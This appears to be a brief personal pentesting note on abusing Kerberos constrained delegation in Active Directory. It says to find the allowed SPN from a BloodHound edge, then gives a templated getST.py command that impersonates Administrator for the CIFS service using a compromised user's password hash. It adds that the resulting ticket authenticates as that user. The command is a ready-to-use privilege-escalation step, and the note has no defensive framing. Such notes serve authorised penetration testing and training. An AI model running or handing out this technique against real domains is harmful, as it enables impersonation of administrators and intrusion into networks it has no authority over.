can impersonate another user
  
to check what SPN you are allowed to delegate for, check the bloodhound edge
- at the very bottom it gives you the SPN
![image 416.png](../../assets/GetST/image%20416.png)
  
![image 1 311.png](../../assets/GetST/image%201%20311.png)
[getST.py](http://getst.py/) -spn '<spn>' -impersonate 'Administrator' -altservice 'cifs' -hashes <hash> '<domain>/<compromised_user>'
  
can use this service ticket to authenticate as the user